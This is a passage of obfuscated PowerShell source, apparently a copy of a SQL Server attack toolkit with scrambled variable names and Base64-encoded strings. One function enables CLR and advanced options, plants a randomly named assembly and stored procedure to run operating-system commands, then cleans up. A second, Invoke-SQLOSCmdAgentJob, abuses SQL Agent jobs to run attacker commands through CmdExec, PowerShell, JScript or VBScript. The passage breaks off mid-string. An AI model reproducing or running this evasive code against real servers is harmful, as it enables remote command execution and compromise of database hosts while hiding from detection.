    Begin
    {
        ${_____/===\_/=====} = New-Object -TypeName System.Data.DataTable
        ${/=\_____/\/\/=\__} = New-Object -TypeName System.Data.DataTable
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBhAG4AZABSAGUAcwB1AGwAdABzAA=='))))
        ${____/\/=\_/\/===\} = New-Object -TypeName System.Data.DataTable
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($Instance)
        {
            ${_/\/=\/=\/\/\____} = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }
        ${____/\/=\_/\/===\} = ${____/\/=\_/\/===\} + ${_/\/=\/=\/\/\____}
    }
    Process
    {
        ${____/\/=\_/\/===\} = ${____/\/=\_/\/===\} + $_
    }
    End
    {
        ${____/\__/\_/=\__/} = {
            $Instance = $_.Instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }
            if($DAC)
            {
                ${__/=\____/\__/==\} = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
            }
            else
            {
                ${__/=\____/\__/==\} = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
            }
            try
            {
                ${__/=\____/\__/==\}.Open()
                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
                }
                ${_/\_/\/=\/\/=\/\_} = 0
                ${_/======\_/\/=\/=} = 0
                ${__/\/==\____/\_/=} = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
                if(${__/\/==\____/\_/=} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAWQBvAHUAIABhAHIAZQAgAGEAIABzAHkAcwBhAGQAbQBpAG4ALgA=')))
                    ${__/\/\__/\/=\____} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAEMATABSACAARQBuAGEAYgBsAGUAZAAnAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    ${_/\/===\/\/\/==\/} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                }
                else
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAWQBvAHUAIABhAHIAZQAgAG4AbwB0ACAAYQAgAHMAeQBzAGEAZABtAGkAbgAuACAAVABoAGkAcwAgAGMAbwBtAG0AYQBuAGQAIAByAGUAcQB1AGkAcgBlAHMAIABzAHkAcwBhAGQAbQBpAG4AIABwAHIAaQB2AGkAbABlAGcAZQBzAC4A')))
                    $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAcwB5AHMAYQBkAG0AaQBuACAAcAByAGkAdgBpAGwAZQBnAGUAcwAuAA=='))))
                    return
                }
                if (${_/\/===\/\/\/==\/} -eq 1)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBoAG8AdwAgAEEAZAB2AGEAbgBjAGUAZAAgAE8AcAB0AGkAbwBuAHMAIABpAHMAIABhAGwAcgBlAGEAZAB5ACAAZQBuAGEAYgBsAGUAZAAuAA==')))
                }
                else
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBoAG8AdwAgAEEAZAB2AGEAbgBjAGUAZAAgAE8AcAB0AGkAbwBuAHMAIABpAHMAIABkAGkAcwBhAGIAbABlAGQALgA=')))
                    ${_/\_/\/=\/\/=\/\_} = 1
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcALAAxADsAUgBFAEMATwBOAEYASQBHAFUAUgBFAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                    ${__/\____/\/\_/\/\} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    if (${__/\____/\/\_/\/\} -eq 1)
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAGEAYgBsAGUAZAAgAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzAC4A')))
                    }
                    else
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAGEAYgBsAGkAbgBnACAAUwBoAG8AdwAgAEEAZAB2AGEAbgBjAGUAZAAgAE8AcAB0AGkAbwBuAHMAIABmAGEAaQBsAGUAZAAuACAAQQBiAG8AcgB0AGkAbgBnAC4A')))
                        $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkACAAbgBvAHQAIABlAG4AYQBiAGwAZQAgAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzAC4A'))))
                        return
                    }
                }
                if (${__/\/\__/\/=\____} -eq 1)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBMAFIAIABpAHMAIABhAGwAcgBlAGEAZAB5ACAAZQBuAGEAYgBsAGUAZAAuAA==')))
                }
                else
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBMAFIAIABpAHMAIABkAGkAcwBhAGIAbABlAGQALgA=')))
                    ${_/======\_/\/=\/=} = 1
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAEMATABSACAARQBuAGEAYgBsAGUAZAAnACwAMQA7AFIARQBDAE8ATgBGAEkARwBVAFIARQA='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                    ${_/\/\/\___/\/====} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAiAEMATABSACAARQBuAGEAYgBsAGUAZAAiAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    if (${_/\/\/\___/\/====} -eq 1)
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAGEAYgBsAGUAZAAgAEMATABSAC4A')))
                    }
                    else
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAGEAYgBsAGkAbgBnACAAQwBMAFIAIABmAGEAaQBsAGUAZAAuACAAQQBiAG8AcgB0AGkAbgBnAC4A')))
                        $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkACAAbgBvAHQAIABlAG4AYQBiAGwAZQAgAEMATABSAC4A'))))
                        return
                    }
                }
                ${___/==\_/\____/=\} = (8..15 | Get-Random -count 1 )
                ${/=\/\/\__/===\/\/} = (-join ((65..90) + (97..122) | Get-Random -Count ${___/==\_/\____/=\} | % {[char]$_}))
                ${_/=\_/\__/=\_/\_/} = (-join ((65..90) + (97..122) | Get-Random -Count ${___/==\_/\____/=\} | % {[char]$_}))
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQQBzAHMAZQBtAGIAbAB5ACAAbgBhAG0AZQA6ACAAJAB7AC8APQBcAC8AXAAvAFwAXwBfAC8APQA9AD0AXAAvAFwALwB9AA==')))
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBMAFIAIABQAHIAbwBjAGUAZAB1AHIAZQAgAG4AYQBtAGUAOgAgACQAewBfAC8APQBcAF8ALwBcAF8AXwAvAD0AXABfAC8AXABfAC8AfQA=')))
                ${__/==\/\_/\/===\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('')))
                Get-SQLQuery -Instance $Instance -Query ${__/==\/\_/\/===\/} -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -Database $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBTAEQAQgA='))) 
                ${_/\____/\__/\/\_/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBSAEUAQQBUAEUAIABQAFIATwBDAEUARABVAFIARQAgAFsAZABiAG8AXQAuAFsAJAB7AF8ALwA9AFwAXwAvAFwAXwBfAC8APQBcAF8ALwBcAF8ALwB9AF0AIABAAGUAeABlAGMAQwBvAG0AbQBhAG4AZAAgAE4AVgBBAFIAQwBIAEEAUgAgACgATQBBAFgAKQAgAEEAUwAgAEUAWABUAEUAUgBOAEEATAAgAE4AQQBNAEUAIABbACQAewAvAD0AXAAvAFwALwBcAF8AXwAvAD0APQA9AFwALwBcAC8AfQBdAC4AWwBTAHQAbwByAGUAZABQAHIAbwBjAGUAZAB1AHIAZQBzAF0ALgBbAGMAbQBkAF8AZQB4AGUAYwBdADsA')))
                Get-SQLQuery -Instance $Instance -Query ${_/\____/\__/\/\_/} -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -Database $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBTAEQAQgA='))) 
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUgB1AG4AbgBpAG4AZwAgAGMAbwBtAG0AYQBuAGQAOgAgACQAQwBvAG0AbQBhAG4AZAA=')))
                $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAQwAgAFsAJAB7AF8ALwA9AFwAXwAvAFwAXwBfAC8APQBcAF8ALwBcAF8ALwB9AF0AIAAnACQAQwBvAG0AbQBhAG4AZAAnAA==')))                
                ${____/=\_/\___/=\/} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -Database $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBTAEQAQgA='))) 
                if($RawResults)
                {
                    [string]${____/=\_/\___/=\/}.output
                }
                else
                {
                    try
                    {
                       $null = ${/=\_____/\/\/=\__}.Rows.Add($ComputerName, $Instance, [string]${____/=\_/\___/=\/}.output)
                    }
                    catch
                    {
                    }
                }
                Get-SQLQuery -Instance $Instance -Query $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABSAE8AUAAgAFAAUgBPAEMARQBEAFUAUgBFACAAJAB7AF8ALwA9AFwAXwAvAFwAXwBfAC8APQBcAF8ALwBcAF8ALwB9AA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -Database $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBTAEQAQgA=')))
                Get-SQLQuery -Instance $Instance -Query $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABSAE8AUAAgAEEAUwBTAEUATQBCAEwAWQAgACQAewAvAD0AXAAvAFwALwBcAF8AXwAvAD0APQA9AFwALwBcAC8AfQA='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -Database $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBTAEQAQgA=')))
                if(${_/======\_/\/=\/=} -eq 1)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARABpAHMAYQBiAGwAaQBuAGcAIABDAEwAUgA=')))
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAEMATABSACAARQBuAGEAYgBsAGUAZAAnACwAMAA7AFIARQBDAE8ATgBGAEkARwBVAFIARQA='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }
                if(${_/\_/\/=\/\/=\/\_} -eq 1)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARABpAHMAYQBiAGwAaQBuAGcAIABTAGgAbwB3ACAAQQBkAHYAYQBuAGMAZQBkACAATwBwAHQAaQBvAG4AcwA=')))
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcALAAwADsAUgBFAEMATwBOAEYASQBHAFUAUgBFAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }
                ${__/=\____/\__/==\}.Close()
                ${__/=\____/\__/==\}.Dispose()
            }
            catch
            {
                if(-not $SuppressVerbose)
                {
                    ${/=\_______/===\__} = $_.Exception.Message
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
                }
                $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIABBAGMAYwBlAHMAcwBpAGIAbABlAA=='))))
            }
        }
        ${____/\/=\_/\/===\} | Invoke-Parallel -ScriptBlock ${____/\__/\_/=\__/} -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
        return ${/=\_____/\/\/=\__}
    }
}
Function  Invoke-SQLOSCmdAgentJob
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,
        [Parameter(Mandatory = $true,
        HelpMessage = 'Support subsystems include CmdExec, PowerShell, JScript, and VBScript.')]
        [ValidateSet("CmdExec", "PowerShell","JScript","VBScript")]
        [string] $SubSystem,
        [Parameter(Mandatory = $true,
        HelpMessage = 'OS command to be executed.')]
        [String]$Command,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Command run time before killing the agent job.')]
        [int]$Sleep = 5,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${_____/===\_/=====} = New-Object -TypeName System.Data.DataTable
        ${/=\_____/\/\/=\__} = New-Object -TypeName System.Data.DataTable
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAcwA='))))
    }
    Process
    {
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($DAC)
        {
            ${__/=\____/\__/==\} = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
        }
        else
        {
            ${__/=\____/\__/==\} = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
        }
        try
        {
            ${__/=\____/\__/==\}.Open()
            if(-not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwB1AGIAUwB5AHMAdABlAG0AOgAgACQAUwB1AGIAUwB5AHMAdABlAG0A')))
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG0AbQBhAG4AZAA6ACAAJABDAG8AbQBtAGEAbgBkAA==')))
            }
            ${_/==\_/==\___/\_/} = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            ${/=\_/==\__/\/\_/=} = ${_/==\_/==\___/\_/}.CurrentLogin
            $ComputerName = ${_/==\_/==\___/\_/}.ComputerName
            ${__/=\/=\/\_/\____} = ${_/==\_/==\___/\_/}.IsSysAdmin
            if(${__/=\/=\/\_/\____} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))){
                ${_/\/\/\/==\/\/\/\} = ${/=\_/==\__/\/\_/=}
            }
            ${_/\_/==\/==\_/\__} = Get-SQLDatabaseRoleMember -Username $Username -Password $Password -Instance $Instance -DatabaseName msdb -SuppressVerbose |             
            % {                                 
                if(($_.RolePrincipalName -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAQQBnAGUAbgB0AFUAcwBlAHIAUgBvAGwAZQB8AFMAUQBMAEEAZwBlAG4AdABSAGUAYQBkAGUAcgBSAG8AbABlAHwAUwBRAEwAQQBnAGUAbgB0AE8AcABlAHIAYQB0AG8AcgBSAG8AbABlAA=='))))) {
                    if ($_.PrincipalName -eq ${/=\_/==\__/\/\_/=}) { 
                        ${_/\/\/\/==\/\/\/\} = ${/=\_/==\__/\/\_/=} 
                    }
                }
            }
            if(${_/\/\/\/==\/\/\/\})
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAWQBvAHUAIABoAGEAdgBlACAARQBYAEUAQwBVAFQARQAgAHAAcgBpAHYAaQBsAGUAZwBlAHMAIAB0AG8AIABjAHIAZQBhAHQAZQAgAEEAZwBlAG4AdAAgAEoAbwBiAHMAIAAoAHMAcABfAGEAZABkAF8AagBvAGIAKQAuAA==')))
                ${_/====\/=======\_} = ""
                ${_/\__/\___/=\___/} = $SubSystem
                If($SubSystem -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SgBTAGMAcgBpAHAAdAA=')))){
                    $Command = $Command.Replace("\","\\")
                    ${/=\_/==\/=\_/==\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUgB1AG4AQwBtAGQAKAApAA0ACgB7AA0ACgAgACAAIAAgAHYAYQByACAAVwBzAGgAUwBoAGUAbABsACAAPQAgAG4AZQB3ACAAQQBjAHQAaQB2AGUAWABPAGIAagBlAGMAdAAoACIAVwBTAGMAcgBpAHAAdAAuAFMAaABlAGwAbAAiACkAOwAgACAADQAKACAAIAAgACAAdgBhAHIAIABvAEUAeABlAGMAIAA9ACAAVwBzAGgAUwBoAGUAbABsAC4ARQB4AGUAYwAoACIAJABDAG8AbQBtAGEAbgBkACIAKQA7ACAADQAKACAAIAAgACAAbwBFAHgAZQBjACAAPQAgAG4AdQBsAGwAOwAgAA0ACgAgACAAIAAgAFcAcwBoAFMAaABlAGwAbAAgAD0AIABuAHUAbABsADsAIAANAAoAfQANAAoAUgB1AG4AQwBtAGQAKAApADsAIAA=')))
                    $Command = ${/=\_/==\/=\_/==\/}
                    ${_/\__/\___/=\___/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAHQAaQB2AGUAUwBjAHIAaQBwAHQAaQBuAGcA')))
                    ${_/====\/=======\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QABkAGEAdABhAGIAYQBzAGUAXwBuAGEAbQBlAD0ATgAnAEoAYQB2AGEAUwBjAHIAaQBwAHQAJwAsAA==')))	
                }
                If($SubSystem -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBCAFMAYwByAGkAcAB0AA==')))){
                    ${___/\/====\/\/\__} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgB1AG4AYwB0AGkAbwBuACAATQBhAGkAbgAoACkADQAKACAAIAAgACAAZABpAG0AIABzAGgAZQBsAGwADQAKACAAIAAgACAAcwBlAHQAIABzAGgAZQBsAGwAPQAgAEMAcgBlAGEAdABlAE8AYgBqAGUAYwB0ACAAKAAiAFcAUwBjAHIAaQBwAHQALgBTAGgAZQBsAGwAIgApAA0ACgAgACAAIAAgAHMAaABlAGwAbAAuAHIAdQBuACgAIgAkAEMAbwBtAG0AYQBuAGQAIgApAA0ACgAgACAAIAAgAHMAZQB0ACAAcwBoAGUAbABsACAAPQAgAG4AbwB0AGgAaQBuAGcADQAKAEUATgBEACAARgB1AG4AYwB0AGkAbwBuAA==')))
                    $Command = ${___/\/====\/\/\__}
                    ${_/\__/\___/=\___/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAHQAaQB2AGUAUwBjAHIAaQBwAHQAaQBuAGcA')))
                    ${_/====\/=======\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QABkAGEAdABhAGIAYQBzAGUAXwBuAGEAbQBlAD0ATgAnAFYAQgBTAGMAcgBpAHAAdAAnACwA')))	
                }                
                $Command = $Command -replace "'","''"
                ${___/=\_/====\/=\_} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBTAEUAIABtAHMAZABiADsAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABFAFgARQBDAFUAVABFACAAZABiAG8ALgBzAHAAXwBhAGQAZABfAGoAbwBiACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQABqAG8AYgBfAG4AYQBtAGUAIAAgACAAIAAgACAAIAAgACAAIAAgAD0AIABOACcAcABvAHcAZQByAHUAcABzAHEAbABfAGoAbwBiACcADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARQBYAEUAQwBVAFQARQAgAHMAcABfAGEAZABkAF8AagBvAGIAcwB0AGUAcAAgAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEAAagBvAGIAXwBuAGEAbQBlACAAIAAgACAAIAAgACAAIAAgACAAIAA9ACAATgAnAHAAbwB3AGUAcgB1AHAAcwBxAGwAXwBqAG8AYgAnACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQABzAHQAZQBwAF8AbgBhAG0AZQAgACAAIAAgACAAIAAgACAAIAA9ACAATgAnAHAAbwB3AGUAcgB1AHAAcwBxAGwAXwBqAG8AYgBfAHMAdABlAHAAJwAsACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQABzAHUAYgBzAHkAcwB0AGUAbQAgACAAIAAgACAAIAAgACAAIAA9ACAATgAnACQAewBfAC8AXABfAF8ALwBcAF8AXwBfAC8APQBcAF8AXwBfAC8AfQAnACwAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABAAGMAbwBtAG0AYQBuAGQAIAAgACAAIAAgACAAIAAgACAAIAAgAD0AIABOACcAJABDAG8AbQBtAGEAbgBkACcALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHsAXwAvAD0APQA9AD0AXAAvAD0APQA9AD0APQA9AD0AXABfAH0AIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABAAGYAbABhAGcAcwA9ADAALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABAAHIAZQB0AHIAeQBfAGEAdAB0AGUAbQBwAHQAcwAgACAAIAAgAD0AIAAxACwAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABAAHIAZQB0AHIAeQBfAGkAbgB0AGUAcgB2AGEAbAAgACAAIAAgAD0AIAA1ACAAIAAgACAAIAANAAoAI